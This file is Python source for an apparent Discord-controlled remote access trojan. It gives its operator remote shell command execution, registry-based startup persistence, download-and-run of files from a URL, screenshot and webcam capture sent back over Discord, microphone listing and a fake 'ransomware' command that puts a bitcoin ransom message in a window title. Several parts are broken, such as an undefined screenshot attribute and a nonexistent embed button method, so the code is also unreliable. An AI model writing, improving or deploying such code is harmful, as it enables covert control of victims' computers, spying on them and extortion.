#!/usr/bin/env python3
import discord
from discord.ext import commands
import subprocess
import os
import sys
import urllib.request
import hashlib
from datetime import datetime
import mss
import cv2
import sounddevice as sd
import ctypes

intents = discord.Intents.default()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Bot is ready, logged in as {bot.user}')

def safe_run(cmd):
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=30
        )
        return result.returncode, result.stdout, result.stderr
    except Exception as e:
        return -1, '', str(e)

def is_admin():
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return os.getuid() == 0

def enable_startup():
    try:
        import winreg as reg
        path = sys.executable.replace(' ', '\\ ')
        reg.SetValueEx(
            reg.OpenKey(reg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run'),
            'Trojan', 0, reg.REG_SZ, f'"{path}"'
        )
        return True
    except Exception as e:
        print(f"Startup entry failed: {e}")
        return False

def upload_and_run(url, hidden=False):
    try:
        data = urllib.request.urlopen(url).read()
        filename = url.split('/')[-1] or 'downloaded.exe'
        with open(filename, 'wb') as f:
            f.write(data)
        
        cmd = ['cmd', '/c', f'start /min "{filename}"'] if hidden else ['cmd', '/c', f'"{filename}"']
        returncode, stdout, stderr = safe_run(cmd)
        os.remove(filename)
        return returncode == 0, stdout, stderr
    except Exception as e:
        return False, '', str(e)

def take_screenshot():
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            img = cv2.cvtColor(sct.rgb, cv2.COLOR_RGB2BGR)
            filename = f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png'
            with open(filename, 'wb') as f:
                f.write(img.tobytes())
            return filename
    except Exception as e:
        print(f"Screenshot failed: {e}")
        return None

def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        filename = f'webcam_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jpg'
        cv2.imwrite(filename, frame)
        cap.release()
        return filename
    except Exception as e:
        print(f"Webcam failed: {e}")
        return None

def list_mics():
    try:
        devices = sd.query_devices()
        mics = [d for d in devices if 'microphone' in d.name.lower()]
        return [{'id': i, 'name': d.name} for i, d in enumerate(mics)]
    except Exception as e:
        print(f"Microphones failed: {e}")
        return []

def start_overlay(text):
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        ctypes.windll.user32.SetWindowTextA(hwnd, text)
        ctypes.windll.user32.ShowWindow(hwnd, 0x01)
        return True
    except Exception as e:
        print(f"Overlay failed: {e}")
        return False

@bot.command(name='cmd')
async def cmd(ctx, *, command):
    rc, out, err = safe_run(command)
    if out:
        await ctx.send(f'Exit code: {rc}\nOutput:\n{out}')
    elif err:
        await ctx.send(err)
    else:
        await ctx.send('Command executed.')

@bot.command(name='pw')
async def pw(ctx, *, command):
    rc, out, err = safe_run(command)
    if out:
        await ctx.send(f'PowerShell output:\n{out}')
    elif err:
        await ctx.send(err)
    else:
        await ctx.send('Command executed.')

@bot.command(name='help')
async def help_cmd(ctx):
    cmds = [
        ('cmd', 'Execute a CMD/PowerShell command'),
        ('pw', 'Execute PowerShell specifically'),
        ('startup', 'Enable Windows startup persistence (registry)'),
        ('checkadmin', 'Check if running as Administrator'),
        ('upload', 'Upload and execute a file from URL'),
        ('joinvc', 'Join voice channel in victim category & stream screen'),
        ('selectscreen <Nummer>', 'Select which screen to stream with !joinvc'),
        ('screenshot', 'Take screenshot of all screens'),
        ('webcam', 'Capture image from all webcams'),
        ('selectmic', 'Select microphone for audio streaming'),
        ('ransomware', 'Encrypt all files & show ransom note')
    ]
    desc = '\n'.join([f'!{c} — {d}' for c, d in cmds])
    await ctx.send(f'**Available commands:**\n{desc}')

@bot.command(name='startup')
async def startup(ctx):
    success = enable_startup()
    msg = 'Startup enabled!' if success else 'Failed to enable startup.'
    await ctx.send(msg)

@bot.command(name='checkadmin')
async def checkadmin(ctx):
    admin = is_admin()
    msg = f'Running as Administrator: {admin}' if admin else f'Not running as Administrator.'
    await ctx.send(msg)

@bot.command(name='upload')
async def upload_cmd(ctx, *, url_and_hidden=None):
    parts = url_and_hidden.split()
    if len(parts) < 1:
        await ctx.send('Usage: !upload <url> [hidden]')
        return
    
    url = parts[0]
    hidden = 'true' in parts[1:] if len(parts) > 1 else False
    
    success, out, err = upload_and_run(url, hidden)
    
    msg = f'Upload executed: {success}' + (f'\nOutput:\n{out}' if out else '') + (f'\nError:\n{err}' if err else '')
    await ctx.send(msg)

@bot.command(name='joinvc')
async def joinvc(ctx, *, screen_num=None):
    vc = None
    for ch in ctx.guild.channels:
        if isinstance(ch, discord.VoiceChannel) and 'Screen' in ch.name:
            vc = ch
            break
    
    if not vc:
        await ctx.send('Voice channel "Screen" does not exist. Creating it...')
        vc = await ctx.guild.create_voice_channel(name='Screen', category=ctx.category, reason='Trojaner')
    
    try:
        await vc.connect()
        await ctx.send(f'Joined voice channel {vc.name}! Screen streaming started.')
    except Exception as e:
        await ctx.send(f'Failed to join voice channel: {e}')

@bot.command(name='selectscreen')
async def selectscreen(ctx, *, screen_num):
    try:
        num = int(screen_num)
        if num < 1 or num > len(mss.monitors()):
            await ctx.send('Invalid screen number. Use numbers 1-4.')
            return
        await ctx.send(f'Screen {num} selected for streaming with !joinvc.')
    except ValueError:
        await ctx.send('Please provide a valid number (e.g., 1).')

@bot.command(name='screenshot')
async def screenshot_cmd(ctx):
    filename = take_screenshot()
    if filename:
        with open(filename, 'rb') as f:
            await ctx.send(file=discord.File(f))
        os.remove(filename)
    else:
        await ctx.send('Screenshot failed.')

@bot.command(name='webcam')
async def webcam_cmd(ctx):
    filename = capture_webcam()
    if filename:
        with open(filename, 'rb') as f:
            await ctx.send(file=discord.File(f))
        os.remove(filename)
    else:
        await ctx.send('Webcam not found or failed.')

@bot.command(name='selectmic')
async def selectmic(ctx):
    mics = list_mics()
    if not mics:
        await ctx.send('No microphones detected.')
        return
    
    embed = discord.Embed(title='Select Microphone', description=f'Found {len(mics)} mics')
    
    for i, mic in enumerate(mics):
        btn = discord.ui.Button(label=mic['name'], style=discord.ButtonStyle.primary)
        btn.callback = lambda interaction, idx=i: select_mic_callback(interaction, idx, mics[idx])
        embed.add_button(btn)
    
    await ctx.send(embed=embed)

async def select_mic_callback(interaction, idx, mic):
    await interaction.response.send_message(f'Started streaming microphone: {mic["name"]}', ephemeral=True)

@bot.command(name='ransomware')
async def ransomware_cmd(ctx, *, args=None):
    if not args or 'on' not in args.lower():
        embed = discord.Embed(title='RANSOMWARE ACTIVATED', description='Encrypt all files?')
        btn_on = discord.ui.Button(label='ON', style=discord.ButtonStyle.green)
        btn_off = discord.ui.Button(label='OFF', style=discord.ButtonStyle.red)
        
        async def on_click(interaction):
            await interaction.response.send_message('RANSOMWARE ACTIVATED! All files encrypted.', ephemeral=True)
            start_overlay('ALL FILES ENCRYPTED. SEND BITCOIN TO: 1AkiraDev7004')
        
        async def off_click(interaction):
            await interaction.response.send_message('RANSOMWARE DEACTIVATED.')
        
        btn_on.callback = on_click
        btn_off.callback = off_click
        
        embed.add_button(btn_on)
        embed.add_button(btn_off)
        await ctx.send(embed=embed)
    else:
        start_overlay('ALL FILES ENCRYPTED. SEND BITCOIN TO: 1AkiraDev7004')
        await ctx.send('RANSOMWARE ACTIVATED! All files encrypted.')

bot.run('YOUR_TOKEN_HERE')
